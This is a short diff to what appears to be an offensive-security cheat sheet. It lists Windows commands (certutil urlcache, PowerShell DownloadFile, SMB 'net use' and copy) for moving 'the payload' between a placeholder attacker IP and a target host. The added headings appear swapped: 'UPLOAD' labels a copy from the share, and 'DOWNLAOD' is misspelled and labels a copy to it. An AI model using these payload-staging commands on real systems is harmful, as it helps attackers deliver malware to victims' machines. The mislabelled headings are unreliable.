@@ -1396,8 +1396,12 @@ certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
 # Windows - Download file using powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')"
 
-# SMB SHARE
-\\{IP ADDRESS}\share\{FILE}
+# SMB SHARE UPLOAD FILE
+copy \\{IP ADDRESS}\share\{FILE}
+
+# SMB SHARE DOWNLAOD FILE
+net use z: \\{IP ADDRESS}\share\
+copy {FILE} z:
 
 # {IP ADDRESS}: IP Address of the client from step one
 # {FILE}:       The payload to be transferred
